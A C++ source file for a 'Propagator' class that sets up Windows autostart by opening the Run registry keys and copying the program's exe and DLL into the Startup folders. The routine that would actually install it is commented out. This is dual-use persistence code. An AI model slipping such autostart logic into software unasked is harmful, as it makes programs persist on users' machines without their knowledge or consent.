#include "Propagator.h"

Propagator::Propagator(void)
{
	_runUserKey = NULL;
	_runMachineKey = NULL;
}

Propagator::~Propagator(void)
{
	if (_runUserKey)
		RegCloseKey(_runUserKey);
	if (_runMachineKey)
		RegCloseKey(_runMachineKey);
}

void Propagator::init(void)
{
	try {
		setRegKey(HKEY_CURRENT_USER, &_runUserKey, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
		setRegKey(HKEY_LOCAL_MACHINE, &_runMachineKey, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	} catch (std::runtime_error const& e) {
		(void)e;
		//ErrorLogFile::Log << e.what() << std::endl;
	}
	_userStartUpPath = StaticTools::GetFolderPath(CSIDL_STARTUP);
	_commonStartUp = StaticTools::GetFolderPath(CSIDL_COMMON_STARTUP);
}

void Propagator::setApplicationPath(std::string const& appliPath)
{
	_exePath = appliPath;
	_dllPath = StaticTools::GetDLLPath(appliPath);
}

void Propagator::update(void)
{
	//if (IsUserAnAdmin()) {
	//	//if (!isRegValueExist(_runMachineKey, "myprogram")) {
	//	//	addRegValue(_runMachineKey, "myprogram", "\"" + _exePath + "\"");
	//	//}
	//	//if (!isInStartUpFolder(_commonStartUp)) {
	//	//	addInStartUpFolder(_commonStartUp);
	//	//}
	//}
	//if (!isRegValueExist(_runUserKey, "myprogram")) {
	//	addRegValue(_runUserKey, "myprogram", "\"" + _exePath + "\"");
	//}
	//if (!isInStartUpFolder(_userStartUpPath)) {
	//	addInStartUpFolder(_userStartUpPath);
	//}
}

void Propagator::setRegKey(HKEY type, HKEY *toSet, std::string const& path)
{
	long res = RegOpenKeyEx(type, path.c_str(), 0, KEY_READ | KEY_WRITE, toSet);
	if (res != ERROR_SUCCESS)
	{
		std::string hkeyStr;
		if (type == HKEY_CURRENT_USER)
			hkeyStr = "HKEY_CURRENT_USER";
		else if (type == HKEY_LOCAL_MACHINE)
			hkeyStr = "HKEY_LOCAL_MACHINE";
		throw (std::runtime_error(std::string("Warning: can't access '" + hkeyStr + "\\" + path + "'")));
	}
}

bool Propagator::isRegValueExist(HKEY key, std::string const& path) const
{
	return (RegQueryValueEx(key, path.c_str(), NULL, NULL, NULL, NULL) != ERROR_FILE_NOT_FOUND);
}

void Propagator::addRegValue(HKEY key, std::string const& name, std::string const& value)
{
	long res = RegSetValueEx(key, name.c_str(), 0, REG_SZ, (LPBYTE)value.c_str(), value.size());
	if (res != ERROR_SUCCESS) {
		//ErrorLogFile::Log << "Warning: can't writing to registry" << std::endl;
	}
}

bool Propagator::isInStartUpFolder(std::string const& startUpFolder) const
{
	std::string startUpExePath;
	std::string startUpDllPath;

	if (startUpFolder.empty())
		return (true);

	startUpExePath = startUpFolder + "\\" + APP_NAME;
	startUpDllPath = startUpFolder + "\\" + DLL_NAME;

	std::ifstream ifsExe(startUpExePath.c_str());
	std::ifstream ifsDll(startUpDllPath.c_str());
	if (ifsDll && ifsExe) {
		ifsDll.close();
		ifsExe.close();
		return (true);
	}
	if (ifsDll)
		ifsDll.close();
	else if (ifsExe)
		ifsExe.close();

	return (false);
}

void Propagator::addInStartUpFolder(std::string const& startUpFolder)
{
	std::string startUpExePath;
	std::string startUpDllPath;

	if (!startUpFolder.empty()) {
		startUpExePath = startUpFolder + "\\" + APP_NAME;
		startUpDllPath = startUpFolder + "\\" + DLL_NAME;

		CopyFile(_exePath.c_str(), startUpExePath.c_str(), FALSE);
		CopyFile(_dllPath.c_str(), startUpDllPath.c_str(), FALSE);

		//DebugLogFile::Log << "Copying " + _exePath + " to " + startUpExePath << std::endl;
		//DebugLogFile::Log << "Copying " + _dllPath + " to " + startUpDllPath << std::endl;
	}
}